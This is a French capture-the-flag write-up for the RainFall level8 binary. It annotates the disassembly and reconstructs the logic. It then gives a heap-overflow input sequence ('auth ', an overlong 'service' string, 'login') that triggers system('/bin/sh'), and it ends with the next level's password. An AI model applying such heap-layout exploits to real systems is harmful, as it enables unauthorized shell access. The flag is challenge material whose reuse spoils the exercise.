```
08048564 <main>:
 8048564:	55                   	push   ebp
 8048565:	89 e5                	mov    ebp,esp
 8048567:	57                   	push   edi
 8048568:	56                   	push   esi
 8048569:	83 e4 f0             	and    esp,0xfffffff0
 804856c:	81 ec a0 00 00 00    	sub    esp,0xa0						; 160
 8048572:	eb 01                	jmp    8048575 <main+0x11>			; 8048575
 8048574:	90                   	nop
 8048575:	8b 0d b0 9a 04 08    	mov    ecx,DWORD PTR ds:0x8049ab0
 804857b:	8b 15 ac 9a 04 08    	mov    edx,DWORD PTR ds:0x8049aac
 8048581:	b8 10 88 04 08       	mov    eax,0x8048810				; "%p, %p \n"
 8048586:	89 4c 24 08          	mov    DWORD PTR [esp+0x8],ecx
 804858a:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804858e:	89 04 24             	mov    DWORD PTR [esp],eax
 8048591:	e8 7a fe ff ff       	call   8048410 <printf@plt>			; printf("%p, %p \n", *0x8049aac, *0x8049ab0);
 8048596:	a1 80 9a 04 08       	mov    eax,ds:0x8049a80				; STDIN
 804859b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804859f:	c7 44 24 04 80 00 00 	mov    DWORD PTR [esp+0x4],0x80		; 128
 80485a6:	00 
 80485a7:	8d 44 24 20          	lea    eax,[esp+0x20]				; char *str_input;
 80485ab:	89 04 24             	mov    DWORD PTR [esp],eax
 80485ae:	e8 8d fe ff ff       	call   8048440 <fgets@plt>			; fgets(str_input, 128, STDIN);
 80485b3:	85 c0                	test   eax,eax						; if (fgets(...) == NULL)
 80485b5:	0f 84 71 01 00 00    	je     804872c <main+0x1c8>			; 804872c (on return)
 80485bb:	8d 44 24 20          	lea    eax,[esp+0x20]
 80485bf:	89 c2                	mov    edx,eax
 80485c1:	b8 19 88 04 08       	mov    eax,0x8048819				; "auth "
 80485c6:	b9 05 00 00 00       	mov    ecx,0x5
 80485cb:	89 d6                	mov    esi,edx
 80485cd:	89 c7                	mov    edi,eax
 80485cf:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]	; strncmp(str_input, "auth ", 5);
 80485d1:	0f 97 c2             	seta   dl									 	; if str_input > "auth " set dl = 1
 80485d4:	0f 92 c0             	setb   al									 	; if str_input < "auth " set al = 1
 80485d7:	89 d1                	mov    ecx,edx
 80485d9:	28 c1                	sub    cl,al									; Un octet de ecx (5 -  lower?)
 80485db:	89 c8                	mov    eax,ecx									; eax = ecx
 80485dd:	0f be c0             	movsx  eax,al
 80485e0:	85 c0                	test   eax,eax									; is al = 0 ?
 80485e2:	75 5e                	jne    8048642 <main+0xde>						; if al != 0
 80485e4:	c7 04 24 04 00 00 00 	mov    DWORD PTR [esp],0x4
 80485eb:	e8 80 fe ff ff       	call   8048470 <malloc@plt>						; int *ptr = malloc(4)
 80485f0:	a3 ac 9a 04 08       	mov    ds:0x8049aac,eax
 80485f5:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 80485fa:	c7 00 00 00 00 00    	mov    DWORD PTR [eax],0x0						; *ptr = 0;
 8048600:	8d 44 24 20          	lea    eax,[esp+0x20]							; str_input
 8048604:	83 c0 05             	add    eax,0x5									; str_input + 5
 8048607:	c7 44 24 1c ff ff ff 	mov    DWORD PTR [esp+0x1c],0xffffffff			; -1
 804860e:	ff 
 804860f:	89 c2                	mov    edx,eax
 8048611:	b8 00 00 00 00       	mov    eax,0x0
 8048616:	8b 4c 24 1c          	mov    ecx,DWORD PTR [esp+0x1c]					; ecx = -1
 804861a:	89 d7                	mov    edi,edx
 804861c:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; al:0, es:[str_input + 5]
 804861e:	89 c8                	mov    eax,ecx
 8048620:	f7 d0                	not    eax						; eax = strlen(str_input)
 8048622:	83 e8 01             	sub    eax,0x1					; eax -= 1
 8048625:	83 f8 1e             	cmp    eax,0x1e					; 30
 8048628:	77 18                	ja     8048642 <main+0xde>		; jump is eax is above 30 (unsigned)
 804862a:	8d 44 24 20          	lea    eax,[esp+0x20]
 804862e:	8d 50 05             	lea    edx,[eax+0x5]
 8048631:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 8048636:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804863a:	89 04 24             	mov    DWORD PTR [esp],eax
 804863d:	e8 1e fe ff ff       	call   8048460 <strcpy@plt>		; strcpy(0x8049aac, str_input + 5)
 8048642:	8d 44 24 20          	lea    eax,[esp+0x20]
 8048646:	89 c2                	mov    edx,eax
 8048648:	b8 1f 88 04 08       	mov    eax,0x804881f								; "reset"
 804864d:	b9 05 00 00 00       	mov    ecx,0x5
 8048652:	89 d6                	mov    esi,edx
 8048654:	89 c7                	mov    edi,eax
 8048656:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]	; strncmp(str_input, "reset", 5)
 8048658:	0f 97 c2             	seta   dl
 804865b:	0f 92 c0             	setb   al
 804865e:	89 d1                	mov    ecx,edx
 8048660:	28 c1                	sub    cl,al
 8048662:	89 c8                	mov    eax,ecx
 8048664:	0f be c0             	movsx  eax,al
 8048667:	85 c0                	test   eax,eax
 8048669:	75 0d                	jne    8048678 <main+0x114>
 804866b:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 8048670:	89 04 24             	mov    DWORD PTR [esp],eax
 8048673:	e8 a8 fd ff ff       	call   8048420 <free@plt>		; free(0x8049aac)
 8048678:	8d 44 24 20          	lea    eax,[esp+0x20]
 804867c:	89 c2                	mov    edx,eax
 804867e:	b8 25 88 04 08       	mov    eax,0x8048825
 8048683:	b9 06 00 00 00       	mov    ecx,0x6
 8048688:	89 d6                	mov    esi,edx
 804868a:	89 c7                	mov    edi,eax
 804868c:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]	; strncmp(str_input, "service", 6)
 804868e:	0f 97 c2             	seta   dl
 8048691:	0f 92 c0             	setb   al
 8048694:	89 d1                	mov    ecx,edx
 8048696:	28 c1                	sub    cl,al
 8048698:	89 c8                	mov    eax,ecx
 804869a:	0f be c0             	movsx  eax,al
 804869d:	85 c0                	test   eax,eax
 804869f:	75 14                	jne    80486b5 <main+0x151>
 80486a1:	8d 44 24 20          	lea    eax,[esp+0x20]
 80486a5:	83 c0 07             	add    eax,0x7
 80486a8:	89 04 24             	mov    DWORD PTR [esp],eax
 80486ab:	e8 80 fd ff ff       	call   8048430 <strdup@plt>
 80486b0:	a3 b0 9a 04 08       	mov    ds:0x8049ab0,eax		; *0x8049ab0 = strdup(str_input + 7);
 80486b5:	8d 44 24 20          	lea    eax,[esp+0x20]
 80486b9:	89 c2                	mov    edx,eax
 80486bb:	b8 2d 88 04 08       	mov    eax,0x804882d
 80486c0:	b9 05 00 00 00       	mov    ecx,0x5
 80486c5:	89 d6                	mov    esi,edx
 80486c7:	89 c7                	mov    edi,eax
 80486c9:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]	; strncmp(str_input, "login", 5)
 80486cb:	0f 97 c2             	seta   dl
 80486ce:	0f 92 c0             	setb   al
 80486d1:	89 d1                	mov    ecx,edx
 80486d3:	28 c1                	sub    cl,al
 80486d5:	89 c8                	mov    eax,ecx
 80486d7:	0f be c0             	movsx  eax,al
 80486da:	85 c0                	test   eax,eax
 80486dc:	0f 85 92 fe ff ff    	jne    8048574 <main+0x10>
 80486e2:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 80486e7:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20]
 80486ea:	85 c0                	test   eax,eax							; if (*0x8049aac + 32 == 0)
 80486ec:	74 11                	je     80486ff <main+0x19b>
 80486ee:	c7 04 24 33 88 04 08 	mov    DWORD PTR [esp],0x8048833		; "/bin/sh"
 80486f5:	e8 86 fd ff ff       	call   8048480 <system@plt>				; system("/bin/sh")
 80486fa:	e9 75 fe ff ff       	jmp    8048574 <main+0x10>
 80486ff:	a1 a0 9a 04 08       	mov    eax,ds:0x8049aa0					; stdout
 8048704:	89 c2                	mov    edx,eax
 8048706:	b8 3b 88 04 08       	mov    eax,0x804883b					; "Password:\n"
 804870b:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804870f:	c7 44 24 08 0a 00 00 	mov    DWORD PTR [esp+0x8],0xa			; 10
 8048716:	00 
 8048717:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 804871e:	00 
 804871f:	89 04 24             	mov    DWORD PTR [esp],eax
 8048722:	e8 29 fd ff ff       	call   8048450 <fwrite@plt>				; fwrite("Password:\n", 1, 10, stdout);
 8048727:	e9 48 fe ff ff       	jmp    8048574 <main+0x10>
 804872c:	90                   	nop
 804872d:	b8 00 00 00 00       	mov    eax,0x0
 8048732:	8d 65 f8             	lea    esp,[ebp-0x8]
 8048735:	5e                   	pop    esi
 8048736:	5f                   	pop    edi
 8048737:	5d                   	pop    ebp
 8048738:	c3                   	ret    
```

Vous voyez lorsqu'un code en `c` est trop long ? Bah là, 143 lignes ça va faire crier la norminette. Bon, à première vu, pas de fonctions annexes.

Notre objectif : `call system` :)

Bon, déjà new instruction has appear :
`repz` = REPeat while Zero
Ce sont des préfixes ajoutables à des instructions sur des chaines de caractères.

`cmps` = CoMPare strings?
En tout cas, d'après des postes sur Stackoverflow, c'est le cas.

La combinaison des deux forme une boucle :
```
while (*esi == *edi && ecx)
{
	esi++;
	s2++;
	ecx--;
}
```
ça ne vous rappel rien ? Roh vraiment rien ? libft ? strncmp ? 


repnz maintenant :
repeat while zero flag is not set and cx is not zero

https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics

C'est un strlen

Pour reverse correctement ce binaire d'une longueur extrême, je vais devoir refaire son programme en C car je ne m'en sors pas !

Bon, d'après mon analyse, même si des zones d'ombres restent présentes, notemment au niveau des instruction `strlen` et `strcpy`
que je n'ai pas compris, et dont le reverse n'apparaitra par conséquent pas dans le code reconstitué, notre but est d'overflow la
variable que j'ai nommée `ptr_1` pour y insérer des vraies caractères au bon endroit (à 32 chars).

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018
```
Lors d'un test effectué, lorsque l'on tape `auth `, notre première allocation est faite à `0x804a008`, et la seconde à `0x804a018`,
soit 16 caractères plus loin. Par conséquent, les 32 chars de `ptr_1` sont en réalité 4 chars de `ptr_2`.

Donc, il faut taper :
`auth `
`serviceeeeeeeeeeeeeeeee`
`login`

Et normalement c'est bon !

Password: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`